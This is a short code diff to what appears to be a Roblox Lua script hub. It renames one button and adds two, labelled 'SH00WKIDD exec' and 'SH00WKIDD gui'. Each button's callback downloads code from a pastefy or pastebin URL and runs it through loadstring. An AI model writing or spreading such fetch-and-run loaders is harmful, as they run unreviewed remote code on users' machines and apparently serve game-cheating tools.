@@ -97,8 +97,15 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
-    Name = "Polaira",
+    Name = "SH00WKIDD exec",
     Callback = function()
-        
+        loadstring(game:HttpGet("https://pastefy.app/Q1wxjOJl/raw"))()
+    end    
+})
+
+Tab:AddButton({
+    Name = "SH00WKIDD gui",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/5w5yW4PP"))()
     end    
 })
